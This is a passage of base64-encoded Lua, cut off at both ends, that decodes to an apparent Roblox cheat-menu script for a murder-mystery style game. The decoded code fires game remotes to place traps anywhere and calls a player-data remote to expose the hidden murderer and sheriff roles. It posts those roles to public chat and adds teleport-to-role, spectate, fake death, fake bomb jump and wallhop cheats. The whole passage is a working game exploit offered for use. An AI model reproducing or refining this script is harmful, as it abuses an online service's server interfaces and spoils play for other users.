JzLkxvY2FsUGxheWVyLkNoYXJhY3RlciB+PSBuaWwgdGhlbgogICAgbG9jYWwgYSA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllcjpHZXRNb3VzZSgpCiAgICBsb2NhbCBiID0gSW5zdGFuY2UubmV3KCJUb29sIikKICAgIGIuUmVxdWlyZXNIYW5kbGUgPSBmYWxzZQogICAgYi5OYW1lID0gIlBsYWNlIFRyYXBzIgogICAgYi5BY3RpdmF0ZWQ6Q29ubmVjdChmdW5jdGlvbigpCiAgICAgICAgbG9jYWwgYyA9IGEuSGl0CiAgICAgICAgbG9jYWwgZCA9IHsKICAgICAgICAgICAgWzFdID0gQ0ZyYW1lLm5ldyhjLlBvc2l0aW9uLlgsIGMuUG9zaXRpb24uWSwgYy5Qb3NpdGlvbi5aLAogICAgICAgICAgICAgICAgMC43NjIxNDI4MzcwNDc1NzY5LCAtNi42MjExNzkxNjA1MDQxOThlLTA5LCAwLjY0NzQwODkwMjY0NTExMTEsCiAgICAgICAgICAgICAgICAyLjkzNDkxMzIwMTM1Nzg1ODNlLTA5LCAxLCA2Ljc3MjE1OTI3NzgwMTM5M2UtMDksCiAgICAgICAgICAgICAgICAtMC42NDc0MDg5MDI2NDUxMTExLCAtMy4yNjEyNjM5MjU1ODAyMzhlLTA5LCAwLjc2MjE0MjgzNzA0NzU3NjkpCiAgICAgICAgfQogICAgICAgIGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5UcmFwLkFjdGl2YXRlOkZpcmVTZXJ2ZXIodW5wYWNrKGQpKQogICAgZW5kKQogICAgYi5QYXJlbnQgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2sKZW5kCmVuZCkKTGlicmFyeS5hZGRCdXR0b24odGFiMywgIlBsYWNlIFRyYXAgVG8gdGhlIEd1bkRyb3AgcG9zIiwgIiIsIGZ1bmN0aW9uKCkKbG9jYWwgZ3VuRHJvcCA9IG5pbApmb3IgXywgdiBpbiBwYWlycyh3b3Jrc3BhY2U6R2V0Q2hpbGRyZW4oKSkgZG8KICAgIGxvY2FsIHRlbXAgPSB2OkZpbmRGaXJzdENoaWxkKCJHdW5Ecm9wIikKICAgIGlmIHRlbXAgdGhlbgogICAgICAgIGd1bkRyb3AgPSB0ZW1wCiAgICAgICAgYnJlYWsKICAgIGVuZAplbmQKaWYgbm90IGd1bkRyb3AgdGhlbiByZXR1cm4gZW5kCgpsb2NhbCBhcmdzID0gewogICAgWzFdID0gQ0ZyYW1lLm5ldyhndW5Ecm9wLlBvc2l0aW9uLlgsIGd1bkRyb3AuUG9zaXRpb24uWSwgZ3VuRHJvcC5Qb3NpdGlvbi5aLCAKICAgICAgICAgICAgICAgICAgICAgMC43NjIxNDI4MzcwNDc1NzY5LCAtNi42MjExNzkxNjA1MDQxOThlLTA5LCAwLjY0NzQwODkwMjY0NTExMTEsIAogICAgICAgICAgICAgICAgICAgICAyLjkzNDkxMzIwMTM1Nzg1ODNlLTA5LCAxLCA2Ljc3MjE1OTI3NzgwMTM5M2UtMDksIAogICAgICAgICAgICAgICAgICAgICAtMC42NDc0MDg5MDI2NDUxMTExLCAtMy4yNjEyNjM5MjU1ODAyMzhlLTA5LCAwLjc2MjE0MjgzNzA0NzU3NjkpCn0KZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLlRyYXAuQWN0aXZhdGU6RmlyZVNlcnZlcih1bnBhY2soYXJncykpCmVuZCkKTGlicmFyeS5hZGRMYWJlbCh0YWIzLCAicm91bmQgdGltZSIpCmxvY2FsIGEgPSBnZXRnZW52KCkuc2F2ZWRDb25maWcuc2hvd1RpbWVyR2FtZSBvciBmYWxzZQpsb2NhbCBiID0gbmlsCmxvY2FsIGMgPSBuaWwKCmxvY2FsIGZ1bmN0aW9uIGQoKQogICAgaWYgYyB0aGVuCiAgICAgICAgYzpEZXN0cm95KCkKICAgIGVuZAogICAgYyA9IEluc3RhbmNlLm5ldygiU2NyZWVuR3VpIikKICAgIGMuTmFtZSA9ICJUaW1lckd1aSIKICAgIGMuUGFyZW50ID0gQ29yZUd1aQogICAgbG9jYWwgZSA9IEluc3RhbmNlLm5ldygiVGV4dExhYmVsIikKICAgIGUuTmFtZSA9ICJUaW1lclRleHQiCiAgICBlLkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxCiAgICBlLlRleHRDb2xvcjMgPSBDb2xvcjMubmV3KDEsIDEsIDEpCiAgICBlLlRleHRTdHJva2VDb2xvcjMgPSBDb2xvcjMubmV3KDAsIDAsIDApCiAgICBlLlRleHRTdHJva2VUcmFuc3BhcmVuY3kgPSAwLjUKICAgIGUuVGV4dFNjYWxlZCA9IHRydWUKICAgIGUuQW5jaG9yUG9pbnQgPSBWZWN0b3IyLm5ldygwLjUsIDAuNSkKICAgIGUuUG9zaXRpb24gPSBVRGltMi5uZXcoMC41LCAwLCAwLjEsIDApCiAgICBlLlNpemUgPSBVRGltMi5uZXcoMCwgMjAwLCAwLCA1MCkKICAgIGUuRm9udCA9IEVudW0uRm9udC5Hb3RoYW1Cb2xkCiAgICBlLlRleHQgPSAiMDowMCIKICAgIGUuUGFyZW50ID0gYwogICAgcmV0dXJuIGUKZW5kCgpsb2NhbCBmdW5jdGlvbiBmKGcpCiAgICB3aGlsZSBhIGRvCiAgICAgICAgbG9jYWwgaCwgaSA9IHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICAgICAgcmV0dXJuIFJlcGxpY2F0ZWRTdG9yYWdlLlJlbW90ZXMuRXh0cmFzLkdldFRpbWVyOkludm9rZVNlcnZlcigpCiAgICAgICAgZW5kKQoKICAgICAgICBpZiBub3QgaCBvciBpIDw9IDAgdGhlbgogICAgICAgICAgICBnLlRleHQgPSAiMDowMCIKICAgICAgICAgICAgZm9yIF8gPSAxLCAzIGRvCiAgICAgICAgICAgICAgICBpZiBub3QgYSB0aGVuIHJldHVybiBlbmQKICAgICAgICAgICAgICAgIGcuVGV4dENvbG9yMyA9IENvbG9yMy5uZXcoMSwgMCwgMCkKICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjUpCiAgICAgICAgICAgICAgICBpZiBub3QgYSB0aGVuIHJldHVybiBlbmQKICAgICAgICAgICAgICAgIGcuVGV4dENvbG9yMyA9IENvbG9yMy5uZXcoMSwgMSwgMSkKICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjUpCiAgICAgICAgICAgIGVuZAogICAgICAgICAgICByZXBlYXQgdGFzay53YWl0KDEpIHVudGlsIG5vdCBhIG9yIFJlcGxpY2F0ZWRTdG9yYWdlLlJlbW90ZXMuRXh0cmFzLkdldFRpbWVyOkludm9rZVNlcnZlcigpID4gMAogICAgICAgIGVsc2UKICAgICAgICAgICAgZy5UZXh0ID0gc3RyaW5nLmZvcm1hdCgiJWQ6JTAyZCIsIGkgLy8gNjAsIGkgJSA2MCkKICAgICAgICAgICAgZy5UZXh0Q29sb3IzID0gaSA8PSAxMCBhbmQgQ29sb3IzLm5ldygxLCAwLCAwKSBvciBDb2xvcjMubmV3KDEsIDEsIDEpCiAgICAgICAgZW5kCiAgICAgICAgdGFzay53YWl0KDAuOSkKICAgIGVuZAplbmQKCkxpYnJhcnkuYWRkVG9nZ2xlKHRhYjMsICJTaG93IFRpbWVyIEdhbWUiLCAiVmVyIHRpZW1wbyBkZSBsYSByb25kYSIsIGEsIGZ1bmN0aW9uKGopCiAgICBhID0gagogICAgZ2V0Z2VudigpLnNhdmVkQ29uZmlnLnNob3dUaW1lckdhbWUgPSBqCiAgICBnZXRnZW52KCkuc2F2ZUNvbmZpZyhnZXRnZW52KCkuc2F2ZWRDb25maWcpCgogICAgaWYgYSB0aGVuCiAgICAgICAgbG9jYWwgayA9IGQoKQogICAgICAgIGIgPSB0YXNrLnNwYXduKGZ1bmN0aW9uKCkgZihrKSBlbmQpCiAgICBlbHNlCiAgICAgICAgaWYgYiB0aGVuCiAgICAgICAgICAgIGEgPSBmYWxzZQogICAgICAgICAgICBiID0gbmlsCiAgICAgICAgICAgIGlmIGMgdGhlbgogICAgICAgICAgICAgICAgYzpEZXN0cm95KCkKICAgICAgICAgICAgICAgIGMgPSBuaWwKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICBlbmQKZW5kKQoKTGlicmFyeS5hZGRMYWJlbCh0YWIzLCAic25pdGNoIHJvbGUiKQoKTGlicmFyeS5hZGRCdXR0b24odGFiMywgInNuaXRjaCB3aG8gaXMgdGhlIHNoZXJpZmYgb3IgbXVyZGVyZXIiLCAiZGVjaXIgZW4gZWwgY2hhdCBxdWllbiBlcyBtdXJkZXJlciBvIHNoZXJpZmYiLCBmdW5jdGlvbigpCmxvY2FsIFJTID0gZ2FtZTpHZXRTZXJ2aWNlKCJSZXBsaWNhdGVkU3RvcmFnZSIpCmxvY2FsIFRDUyA9IGdhbWU6R2V0U2VydmljZSgiVGV4dENoYXRTZXJ2aWNlIikKbG9jYWwgZGF0YSA9IFJTOkZpbmRGaXJzdENoaWxkKCJHZXRQbGF5ZXJEYXRhIiwgdHJ1ZSk6SW52b2tlU2VydmVyKCkKaWYgbm90IGRhdGEgdGhlbiByZXR1cm4gZW5kCmxvY2FsIHNoZXJpZmYsIG11cmRlcmVyCmZvciBuYW1lLCByb2xlIGluIHBhaXJzKGRhdGEpIGRvCiAgICBpZiByb2xlLlJvbGUgPT0gIk11cmRlcmVyIiB0aGVuCiAgICAgICAgbXVyZGVyZXIgPSBuYW1lCiAgICBlbHNlaWYgcm9sZS5Sb2xlID09ICJTaGVyaWZmIiB0aGVuCiAgICAgICAgc2hlcmlmZiA9IG5hbWUKICAgIGVuZAplbmQKaWYgc2hlcmlmZiBhbmQgbXVyZGVyZXIgdGhlbgogICAgVENTLlRleHRDaGFubmVscy5SQlhHZW5lcmFsOlNlbmRBc3luYyhzaGVyaWZmIC4uICIgaXMgdGhlIFNoZXJpZmYgYW5kICIgLi4gbXVyZGVyZXIgLi4gIiBpcyB0aGUgTXVyZGVyZXIuIikKZWxzZWlmIG11cmRlcmVyIHRoZW4KICAgIFRDUy5UZXh0Q2hhbm5lbHMuUkJYR2VuZXJhbDpTZW5kQXN5bmMobXVyZGVyZXIgLi4gIiBpcyB0aGUgTXVyZGVyZXIuIikKZW5kCmVuZCkKCkxpYnJhcnkuYWRkQnV0dG9uKHRhYjMsICJSZXNldCBDYW0iLCAicmVzZXRlYXIgbGEgY8OhbWFyYSIsIGZ1bmN0aW9uKCkKbG9jYWwgcGxheWVyID0gZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIKbG9jYWwgY2hhcmFjdGVyID0gcGxheWVyLkNoYXJhY3RlcgppZiBub3QgY2hhcmFjdGVyIHRoZW4gcmV0dXJuIGVuZApsb2NhbCBodW1hbm9pZCA9IGNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZFdoaWNoSXNBKCdIdW1hbm9pZCcpCmlmIG5vdCBodW1hbm9pZCB0aGVuIHJldHVybiBlbmQKbG9jYWwgY2FtZXJhID0gd29ya3NwYWNlLkN1cnJlbnRDYW1lcmEKY2FtZXJhLkNhbWVyYVR5cGUgPSBFbnVtLkNhbWVyYVR5cGUuQ3VzdG9tCmNhbWVyYS5DYW1lcmFTdWJqZWN0ID0gaHVtYW5vaWQKcGxheWVyLkNhbWVyYU1pblpvb21EaXN0YW5jZSA9IDAuNQpwbGF5ZXIuQ2FtZXJhTWF4Wm9vbURpc3RhbmNlID0gNDAwCnBsYXllci5DYW1lcmFNb2RlID0gRW51bS5DYW1lcmFNb2RlLkNsYXNzaWMKbG9jYWwgaGVhZCA9IGNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSGVhZCIpCmlmIGhlYWQgdGhlbgogICAgaGVhZC5BbmNob3JlZCA9IGZhbHNlCmVuZAplbmQpCgpMaWJyYXJ5LmFkZERyb3Bkb3duKHRhYjMsICJGYWtlIERpZSIsICJTZWxlY3QgYW4gb3B0aW9uIiwgeyJMYXkgT24gQmFjayIsICJTaXQgRG93biJ9LCBmdW5jdGlvbihmKQogICAgbG9jYWwgcCA9IGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyCiAgICBsb2NhbCBjID0gcC5DaGFyYWN0ZXIKICAgIGxvY2FsIGggPSBjIGFuZCBjOkZpbmRGaXJzdENoaWxkT2ZDbGFzcygiSHVtYW5vaWQiKQoKICAgIGlmIG5vdCBoIHRoZW4KICAgICAgICByZXR1cm4KICAgIGVuZAoKICAgIGlmIGYgPT0gIkxheSBPbiBCYWNrIiB0aGVuCiAgICAgICAgaC5TaXQgPSB0cnVlCiAgICAgICAgdGFzay53YWl0KC4xKQogICAgICAgIGxvY2FsIHIgPSBjOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikKICAgICAgICBpZiByIHRoZW4KICAgICAgICAgICAgci5DRnJhbWUgPSByLkNGcmFtZSAqIENGcmFtZS5BbmdsZXMobWF0aC5waSAqIDAuNSwgMCwgMCkKICAgICAgICBlbmQKICAgICAgICBmb3IgXywgYSBpbiBpcGFpcnMoaDpHZXRQbGF5aW5nQW5pbWF0aW9uVHJhY2tzKCkpIGRvCiAgICAgICAgICAgIGE6U3RvcCgpCiAgICAgICAgZW5kCiAgICBlbHNlaWYgZiA9PSAiU2l0IERvd24iIHRoZW4KICAgICAgICBoLlNpdCA9IHRydWUKICAgIGVuZAplbmQpCgpsb2NhbCBmdW5jdGlvbiBHZXRSb2xlUGxheWVyKHJvbGUpCiAgICBsb2NhbCByID0gUmVwbGljYXRlZFN0b3JhZ2U6RmluZEZpcnN0Q2hpbGQoIkdldFBsYXllckRhdGEiLCB0cnVlKTpJbnZva2VTZXJ2ZXIoKQogICAgZm9yIGksIHYgaW4gcGFpcnMocikgZG8KICAgICAgICBpZiB2LlJvbGUgPT0gcm9sZSB0aGVuCiAgICAgICAgICAgIHJldHVybiBQbGF5ZXJzOkZpbmRGaXJzdENoaWxkKGkpCiAgICAgICAgZW5kCiAgICBlbmQKICAgIHJldHVybiBuaWwKZW5kCgpsb2NhbCBmdW5jdGlvbiBUZWxlcG9ydFRvUm9sZShyb2xlKQogICAgbG9jYWwgcCA9IEdldFJvbGVQbGF5ZXIocm9sZSkKICAgIGlmIHAgYW5kIHAuQ2hhcmFjdGVyIGFuZCBwLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpIHRoZW4KICAgICAgICBsb2NhbCBjID0gUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgICAgICBpZiBjIHRoZW4KICAgICAgICAgICAgYzpTZXRQcmltYXJ5UGFydENGcmFtZShwLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkNGcmFtZSkKICAgICAgICBlbmQKICAgIGVuZAplbmQKCmxvY2FsIGZ1bmN0aW9uIFZpZXdSb2xlKHJvbGUpCiAgICBsb2NhbCBwID0gR2V0Um9sZVBsYXllcihyb2xlKQogICAgaWYgcCBhbmQgcC5DaGFyYWN0ZXIgYW5kIHAuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikgdGhlbgogICAgICAgIENhbWVyYS5DYW1lcmFTdWJqZWN0ID0gcC5DaGFyYWN0ZXIuSHVtYW5vaWQKICAgICAgICBDYW1lcmEuQ0ZyYW1lID0gcC5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5DRnJhbWUKICAgIGVuZAplbmQKCkxpYnJhcnkuYWRkTGFiZWwodGFiMywgIlZpZXcgUm9sZXMiKQoKTGlicmFyeS5hZGREcm9wZG93bih0YWIzLCAiVmlldyBSb2xlIiwgIlNlZSByb2xlIiwgeyJNdXJkZXJlciIsICJTaGVyaWZmIiwgIkhlcm8ifSwgZnVuY3Rpb24ocikKICAgIFZpZXdSb2xlKHIpCmVuZCkKTGlicmFyeS5hZGRCdXR0b24odGFiMywgIlJldHVybiB0byBteSBjYW1lcmEiLCAicmVncmVzYXIgYSBtaSBjw6FtYXJhIiwgZnVuY3Rpb24oKQogICAgbG9jYWwgTFAgPSBQbGF5ZXJzLkxvY2FsUGxheWVyCiAgICBpZiBMUC5DaGFyYWN0ZXIgYW5kIExQLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpIHRoZW4KICAgICAgICBDYW1lcmEuQ2FtZXJhU3ViamVjdCA9IExQLkNoYXJhY3Rlci5IdW1hbm9pZAogICAgICAgIENhbWVyYS5DRnJhbWUgPSBMUC5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5DRnJhbWUKICAgIGVuZAplbmQpCgpMaWJyYXJ5LmFkZEJ1dHRvbih0YWI0LCAiRkFLRSBGYWtlIGJvbWIgdHJpY2siLCAiIiwgZnVuY3Rpb24oKQpsb2NhbCBwbGF5ZXIgPSBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllcgpsb2NhbCBjb3JlR3VpLCByZXBsaWNhdGVkU3RvcmFnZSA9IGdhbWU6R2V0U2VydmljZSgiQ29yZUd1aSIpLCBnYW1lOkdldFNlcnZpY2UoIlJlcGxpY2F0ZWRTdG9yYWdlIikKbG9jYWwgZ3VpID0gY29yZUd1aTpGaW5kRmlyc3RDaGlsZCgiYm9tYiIpCmlmIGd1aSB0aGVuIGd1aTpEZXN0cm95KCkgZW5kCmd1aSA9IEluc3RhbmNlLm5ldygiU2NyZWVuR3VpIiwgY29yZUd1aSkKZ3VpLk5hbWUgPSAiYm9tYiIKbG9jYWwgYnRuID0gSW5zdGFuY2UubmV3KCJUZXh0QnV0dG9uIiwgZ3VpKQpidG4uU2l6ZSwgYnRuLlBvc2l0aW9uID0gVURpbTIubmV3KDAsIDEwMCwgMCwgMTAwKSwgVURpbTIubmV3KDEsIC0xMTAsIDAsIDEwKQpidG4uVGV4dCwgYnRuLkZvbnQsIGJ0bi5UZXh0U2l6ZSwgYnRuLlRleHRDb2xvcjMgPSAiRmFrZSBib21iIHRyaWNrIiwgRW51bS5Gb250LkdvdGhhbSwgMTQsIENvbG9yMy5uZXcoMSwgMSwgMSkKYnRuLkJhY2tncm91bmRDb2xvcjMsIGJ0bi5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5LCBidG4uRHJhZ2dhYmxlID0gQ29sb3IzLm5ldygwLCAxLCAwKSwgMC42LCB0cnVlCkluc3RhbmNlLm5ldygiVUlDb3JuZXIiLCBidG4pLkNvcm5lclJhZGl1cyA9IFVEaW0ubmV3KDAsIDE1KQpsb2NhbCBjYW5Vc2UsIGNvb2xkb3duID0gdHJ1ZSwgMjIKbG9jYWwgZnVuY3Rpb24gcmVzZXQoKQogICAgY2FuVXNlLCBidG4uQmFja2dyb3VuZENvbG9yMywgYnRuLlRleHQgPSB0cnVlLCBDb2xvcjMubmV3KDAsIDEsIDApLCAiRmFrZSBib21iIHRyaWNrIgplbmQKbG9jYWwgZnVuY3Rpb24gdXNlQm9tYigpCiAgICBpZiBub3QgY2FuVXNlIHRoZW4gcmV0dXJuIGVuZAogICAgY2FuVXNlLCBidG4uQmFja2dyb3VuZENvbG9yMyA9IGZhbHNlLCBDb2xvcjMubmV3KDEsIDAsIDApCiAgICBsb2NhbCBiYWNrcGFjaywgY2hhciA9IHBsYXllcjpGaW5kRmlyc3RDaGlsZCgiQmFja3BhY2siKSwgcGxheWVyLkNoYXJhY3RlciBvciBwbGF5ZXIuQ2hhcmFjdGVyQWRkZWQ6V2FpdCgpCiAgICBsb2NhbCBib21iID0gYmFja3BhY2s6RmluZEZpcnN0Q2hpbGQoIkZha2VCb21iIikgb3IgY2hhcjpGaW5kRmlyc3RDaGlsZCgiRmFrZUJvbWIiKQogICAgaWYgbm90IGJvbWIgdGhlbgogICAgICAgIHJlcGxpY2F0ZWRTdG9yYWdlLlJlbW90ZXMuRXh0cmFzLlJlcGxpY2F0ZVRveTpJbnZva2VTZXJ2ZXIoIkZha2VCb21iIikKICAgICAgICBib21iID0gYmFja3BhY2s6V2FpdEZvckNoaWxkKCJGYWtlQm9tYiIpIG9yIGNoYXI6V2FpdEZvckNoaWxkKCJGYWtlQm9tYiIpCiAgICBlbmQKICAgIGJvbWIuUGFyZW50ID0gY2hhcgogICAgaWYgYm9tYjpJc0Rlc2NlbmRhbnRPZihjaGFyKSB0aGVuCiAgICAgICAgY2hhcjpGaW5kRmlyc3RDaGlsZE9mQ2xhc3MoIkh1bWFub2lkIik6Q2hhbmdlU3RhdGUoRW51bS5IdW1hbm9pZFN0YXRlVHlwZS5KdW1waW5nKQogICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWQuSnVtcFBvd2VyID0gNTMKICAgICAgICBib21iLlJlbW90ZTpGaXJlU2VydmVyKGNoYXIuSHVtYW5vaWRSb290UGFydC5DRnJhbWUgKiBDRnJhbWUubmV3KDAsIC0zLCAwKSwgNTApCiAgICAgICAgdGFzay53YWl0KC4zKQogICAgICAgIGJvbWIuUGFyZW50ID0gYmFja3BhY2sKICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkLkp1bXBQb3dlciA9IDUxCiAgICBlbmQKICAgIGxvY2FsIHN0YXJ0LCBjdXJyZW50Q2hhciA9IHRpbWUoKSwgcGxheWVyLkNoYXJhY3RlcgogICAgd2hpbGUgdGltZSgpIC0gc3RhcnQgPCBjb29sZG93biBkbwogICAgICAgIGlmIHBsYXllci5DaGFyYWN0ZXIgfj0gY3VycmVudENoYXIgdGhlbiByZXNldCgpIHJldHVybiBlbmQKICAgICAgICBidG4uVGV4dCA9IHN0cmluZy5mb3JtYXQoIkNvb2xkb3duOiAlZHMiLCBjb29sZG93biAtIG1hdGguZmxvb3IodGltZSgpIC0gc3RhcnQpKQogICAgICAgIHRhc2sud2FpdCguMSkKICAgIGVuZAogICAgcmVzZXQoKQplbmQKCmJ0bi5Nb3VzZUJ1dHRvbjFDbGljazpDb25uZWN0KHVzZUJvbWIpCnBsYXllci5DaGFyYWN0ZXJBZGRlZDpDb25uZWN0KHJlc2V0KQpyZXNldCgpCmVuZCkKCkxpYnJhcnkuYWRkQnV0dG9uKHRhYjQsICJXYWxsaG9wIiwgIiIsIGZ1bmN0aW9uKCkKZ2V0Z2VudigpLncgPSBmYWxzZSBnZXRnZW52KCkuYyA9IHRydWUgZ2V0Z2VudigpLmQgPSA1CmxvY2FsIGcgPSBnYW1lOkdldFNlcnZpY2UoIkNvcmVHdWkiKTpGaW5kRmlyc3RDaGlsZCgid04iKSBpZiBnIHRoZW4gcmV0dXJuIGVuZApsb2NhbCBzID0gSW5zdGFuY2UubmV3KCJTY3JlZW5HdWkiKSBzLk5hbWUgPSAid04iIHMuUGFyZW50ID0gZ2FtZTpHZXRTZXJ2aWNlKCJDb3JlR3VpIikKbG9jYWwgYiA9IEluc3RhbmNlLm5ldygiVGV4dEJ1dHRvbiIpIGxvY2FsIHUgPSBJbnN0YW5jZS5uZXcoIlVJQ29ybmVyIikgbG9jYWwgYSA9IEluc3RhbmNlLm5ldygiU291bmQiKQpiLk5hbWUgPSAiQiIgYi5TaXplID0gVURpbTIubmV3KDAsIDUwLCAwLCA1MCkgYi5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLjUsIC01MCwgMC41LCAtMjUpIGIuVGV4dCA9ICJPRkYiIGIuRm9udCA9IEVudW0uRm9udC5Hb3RoYW0gYi5UZXh0U2l6ZSA9IDEyIGIuVGV4dENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpIGIuQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDIwMCwgMjAwLCAyMDApIGIuQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDAuNiBiLkRyYWdnYWJsZSA9IHRydWUgYi5Cb3JkZXJTaXplUGl4ZWwgPSAwIGIuUGFyZW50ID0gcwp1LkNvcm5lclJhZGl1cyA9IFVEaW0ubmV3KDAsIDEwKSB1LlBhcmVudCA9IGIKYS5Tb3VuZElkID0gInJieGFzc2V0aWQ6Ly8xNjczMjgwMjMyIiBhLlBhcmVudCA9IGIKbG9jYWwgZnVuY3Rpb24gdCgpIGdldGdlbnYoKS53ID0gbm90IGdldGdlbnYoKS53IGlmIGdldGdlbnYoKS53IHRoZW4gYi5UZXh0ID0gIk9OIiBiLkJhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigwLCAxMjAsIDApIGVsc2UgYi5UZXh0ID0gIk9GRiIgYi5CYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjAwLCAyMDksIDIwMCkgZW5kCmE6UGxheSgpCmI6VHdlZW5TaXplKFVEaW0yLm5ldygwLCA3MCwgMCwgNjApLCBFbnVtLkVhc2luZ0RpcmVjdGlvbi5PdXQsIEVudW0uRWFzaW5nU3R5bGUuUXVhZCwgMC4yLCB0cnVlKQp0YXNrLndhaXQoMC4yKQpiOlR3ZWVuU2l6ZShVRGltMi5uZXcoMCwgNTAsIDAsIDUwKSwgRW51bS5FYXNpbmdEaXJlY3Rpb24uT3V0LCBFbnVtLkVhc2luZ1N0eWxlLlF1YWQsIDAuMiwgdHJ1ZSkKZW5kCmIuTW91c2VCdXR0b24xQ2xpY2s6Q29ubmVjdCh0KQpsb2NhbCBwID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyIGxvY2FsIHBzID0gZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikgbG9jYWwgaSA9IGdhbWU6R2V0U2VydmljZSgiVXNlcklucHV0U2VydmljZSIpCmxvY2FsIGZ1bmN0aW9uIGwoKSBsb2NhbCB4ID0ge30gZm9yIF8sIHYgaW4gcGFpcnMocHM6R2V0UGxheWVycygpKSBkbyBpZiB2LkNoYXJhY3RlciB0aGVuIHRhYmxlLmluc2VydCh4LCB2LkNoYXJhY3RlcikgZW5kIGVuZCByZXR1cm4geCBlbmQKbG9jYWwgZnVuY3Rpb24geShvLCByKSBpZiBub3QgbyB0aGVuIHJldHVybiBmYWxzZSBlbmQgbG9jYWwgbiA9IFJheWNhc3RQYXJhbXMubmV3KCkgbi5GaWx0ZXJUeXBlID0gRW51bS5SYXljYXN0RmlsdGVyVHlwZS5CbGFja2xpc3Qgbi5GaWx0ZXJEZXNjZW5kYW50c0luc3RhbmNlcyA9IGwoKSBuLklnbm9yZVdhdGVyID0gdHJ1ZSBsb2NhbCBtID0gd29ya3NwYWNlOlJheWNhc3Qoby5Qb3NpdGlvbiwgciAqIGdldGdlbnYoKS5kLCBuKSByZXR1cm4gbSBhbmQgbS5JbnN0YW5jZSB+PSBuaWwgZW5kCmxvY2FsIGZ1bmN0aW9uIHYoaCkgbG9jYWwgaiA9IGg6RmluZEZpcnN0Q2hpbGRPZkNsYXNzKCJIdW1hbm9pZCIpIGxvY2FsIGsgPSBoOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikgbG9jYWwgZSA9IGg6RmluZEZpcnN0Q2hpbGQoIkhlYWQiKSBpZiBub3QgaiBvciBub3QgayBvciBub3QgZSB0aGVuIHJldHVybiBlbmQKaS5KdW1wUmVxdWVzdDpDb25uZWN0KGZ1bmN0aW9uKCkKICAgIGlmIG5vdCBnZXRnZW52KCkudyBvciBub3QgZ2V0Z2VudigpLmMgdGhlbiByZXR1cm4gZW5kIGdldGdlbnYoKS5jID0gZmFsc2UgIAogICAgbG9jYWwgZiwgciwgbCwgcSA9IGsuQ0ZyYW1lLkxvb2tWZWN0b3IsIGsuQ0ZyYW1lLlJpZ2h0VmVjdG9yLCAtay5DRnJhbWUuUmlnaHRWZWN0b3IsIDAgIAogICAgbG9jYWwgd2YsIHdyLCB3bCA9IHkoaywgZikgb3IgeShlLCBmKSwgeShrLCByKSBvciB5KGUsIHIpLCB5KGssIGwpIG9yIHkoZSwgbCkgIAogICAgcSA9ICh3ZiBhbmQgd2wgb3Igd2wpIGFuZCA2MCBvciAod2YgYW5kIHdyIG9yIHdyKSBhbmQgLTYwIG9yIDAgIAogICAgaWYgcSB+PSAwIHRoZW4gay5DRnJhbWUgPSBrLkNGcmFtZSAqIENGcmFtZS5BbmdsZXMoMCwgbWF0aC5yYWQocSksIDApIGo6Q2hhbmdlU3RhdGUoRW51bS5IdW1hbm9pZFN0YXRlVHlwZS5KdW1waW5nKSBlbmQgIAogICAgdGFzay53YWl0KDAuMikgZ2V0Z2VudigpLmMgPSB0cnVlICAKZW5kKQplbmQKbG9jYWwgZnVuY3Rpb24gdyhoKSB0YXNrLndhaXQoMC41KSB2KGgpIGVuZAppZiBwLkNoYXJhY3RlciB0aGVuIHYocC5DaGFyYWN0ZXIpIGVuZApwLkNoYXJhY3RlckFkZGVkOkNvbm5lY3QodykKZW5kKQoKTGlicmFyeS5hZGRMYWJlbCh0YWI0LCAiR3VuIHN0dWZmIikKCkxpYnJhcnkuYWRkRHJvcGRvd24odGFiNCwgIkd1bkRyb3AgdHAvdHdlZW4iLCAiQ2hvb3NlIGFuIGFjdGlvbiIsIHsiVGVsZXBvcnQgdG8gR3VuRHJvcCIsICJUd2VlbiB0byBHdW5Ecm9wIn0sIGZ1bmN0aW9uKHNlbGVjdGVkKQogICAgbG9jYWwgc3VjY2VzcywgZXJyID0gcGNhbGwoZnVuY3Rpb24oKQogICAgI